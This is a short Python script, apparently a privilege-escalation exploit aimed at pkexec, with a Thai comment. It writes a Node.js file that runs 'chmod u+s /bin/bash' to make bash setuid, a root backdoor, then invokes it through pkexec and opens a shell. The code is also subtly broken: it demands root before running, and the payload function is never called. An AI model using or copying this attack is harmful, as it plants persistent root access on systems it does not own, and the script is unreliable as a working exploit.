import os
import sys

def create_payload():
    payload = (
        "module.exports = {" +
        "pkexec: function() {" +
        "const { execSync } = require('child_process');" +
        "execSync('chmod u+s /bin/bash');" +  # เปลี่ยน bash ให้เป็น setuid
        "}" +
        "};"
    )

    with open("exploit.js", "w") as file:
        file.write(payload)

def exploit():
    os.system("pkexec node exploit.js")
    os.system("/bin/bash")

if __name__ == "__main__":
    if os.getuid() != 0:
        print("[-] Please run with root privileges")
        sys.exit(1)

    print("[+] create payload...")
    create_payload()

    print("[+] run exploit...")
    exploit()
